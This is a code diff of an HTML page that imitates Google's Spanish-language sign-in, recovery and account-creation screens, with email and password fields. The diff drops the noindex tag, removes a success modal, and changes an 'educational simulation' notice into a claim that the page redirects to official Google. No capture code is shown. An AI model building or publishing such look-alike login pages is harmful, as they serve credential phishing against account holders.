@@ -6,12 +6,11 @@
     <title>Iniciar sesión - Google</title>
     
     <!-- Meta tags de seguridad -->
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://accounts.google.com https://policies.google.com https://support.google.com; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:;">
-    <meta name="referrer" content="no-referrer-when-downgrade">
-    <meta name="robots" content="noindex, nofollow">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://accounts.google.com https://policies.google.com https://support.google.com; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';">
+    <meta name="referrer" content="no-referrer">
     
     <link rel="stylesheet" href="style.css">
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔐</text></svg>">
+    <link rel="icon" type="image/x-icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🔐</text></svg>">
 </head>
 <body>
     <div class="container">
@@ -29,19 +28,19 @@
             <h2>Iniciar sesión</h2>
             <p class="subtitle">Utiliza tu Cuenta de Google</p>
             
-            <form id="loginForm" action="javascript:void(0)" method="post">
+            <form id="loginForm">
                 <div class="input-group">
-                    <input type="email" id="email" name="email" required autocomplete="off" placeholder=" ">
+                    <input type="email" id="email" name="email" required autocomplete="off">
                     <label for="email">Correo electrónico o teléfono</label>
                 </div>
                 
                 <div class="input-group hidden" id="passwordGroup">
-                    <input type="password" id="password" name="password" required autocomplete="off" placeholder=" ">
+                    <input type="password" id="password" name="password" required autocomplete="off">
                     <label for="password">Introduce tu contraseña</label>
                 </div>
                 
                 <div class="links">
-                    <a href="#forgot" class="forgot-link" id="forgotEmailLink">¿Has olvidado tu correo electrónico?</a>
+                    <a href="#" class="forgot-link" id="forgotEmailLink">¿Has olvidado tu correo electrónico?</a>
                 </div>
                 
                 <div class="info-box hidden" id="securityInfo">
@@ -49,9 +48,9 @@
                 </div>
                 
                 <div class="buttons">
-                    <a href="#create" class="create-account" id="createAccountLink">Crear cuenta</a>
+                    <a href="#" class="create-account" id="createAccountLink">Crear cuenta</a>
                     <button type="button" id="nextBtn" class="btn btn-primary">Siguiente</button>
-                    <button type="submit" id="submitBtn" class="btn btn-primary hidden">Iniciar sesión</button>
+                    <button type="button" id="submitBtn" class="btn btn-primary hidden" onclick="redirectToGoogleLogin()">Iniciar sesión</button>
                 </div>
             </form>
         </div>
@@ -70,9 +69,9 @@
             <h2>Encontrar tu correo electrónico</h2>
             <p class="subtitle">Introduce tu número de teléfono o dirección de correo electrónico de recuperación</p>
             
-            <form id="forgotEmailForm" action="javascript:void(0)" method="post">
+            <form id="forgotEmailForm">
                 <div class="input-group">
-                    <input type="text" id="recoveryInfo" name="recoveryInfo" required autocomplete="off" placeholder=" ">
+                    <input type="text" id="recoveryInfo" name="recoveryInfo" required autocomplete="off">
                     <label for="recoveryInfo">Teléfono o correo electrónico</label>
                 </div>
                 
@@ -82,7 +81,7 @@
                 
                 <div class="buttons">
                     <button type="button" id="backToLoginFromForgot" class="btn btn-secondary">Atrás</button>
-                    <button type="submit" class="btn btn-primary">Siguiente</button>
+                    <button type="button" class="btn btn-primary" onclick="redirectToGoogleRecovery()">Siguiente</button>
                 </div>
             </form>
         </div>
@@ -101,24 +100,24 @@
             <h2>Crear tu cuenta de Google</h2>
             <p class="subtitle">Introduce tu información personal</p>
             
-            <form id="createAccountForm" action="javascript:void(0)" method="post">
+            <form id="createAccountForm">
                 <div class="input-group">
-                    <input type="text" id="firstName" name="firstName" required autocomplete="off" placeholder=" ">
+                    <input type="text" id="firstName" name="firstName" required autocomplete="off">
                     <label for="firstName">Nombre</label>
                 </div>
                 
                 <div class="input-group">
-                    <input type="text" id="lastName" name="lastName" required autocomplete="off" placeholder=" ">
+                    <input type="text" id="lastName" name="lastName" required autocomplete="off">
                     <label for="lastName">Apellidos</label>
                 </div>
                 
                 <div class="input-group">
-                    <input type="email" id="newEmail" name="newEmail" required autocomplete="off" placeholder=" ">
+                    <input type="email" id="newEmail" name="newEmail" required autocomplete="off">
                     <label for="newEmail">Correo electrónico</label>
                 </div>
                 
                 <div class="input-group">
-                    <input type="password" id="newPassword" name="newPassword" required autocomplete="off" placeholder=" ">
+                    <input type="password" id="newPassword" name="newPassword" required autocomplete="off">
                     <label for="newPassword">Contraseña</label>
                 </div>
                 
@@ -128,7 +127,7 @@
                 
                 <div class="buttons">
                     <button type="button" id="backToLoginFromCreate" class="btn btn-secondary">Atrás</button>
-                    <button type="submit" class="btn btn-primary">Crear cuenta</button>
+                    <button type="button" class="btn btn-primary" onclick="redirectToGoogleSignup()">Crear cuenta</button>
                 </div>
             </form>
         </div>
@@ -146,17 +145,9 @@
         </div>
     </div>
 
-    <div id="successModal" class="modal hidden">
-        <div class="modal-content">
-            <h3>Verificación de seguridad</h3>
-            <p>Redirigiendo a tu cuenta...</p>
-            <div class="loading-bar"></div>
-        </div>
-    </div>
-
     <!-- Aviso de demostración -->
     <div class="demo-notice">
-        <p>🔐 <strong>DEMOSTRACIÓN EDUCATIVA</strong> - Esta es una simulación. No se envían datos reales.</p>
+        <p>🔐 <strong>DEMOSTRACIÓN - </strong> Redirige a Google oficial. No se almacenan datos.</p>
     </div>
 
     <script src="script.js"></script>
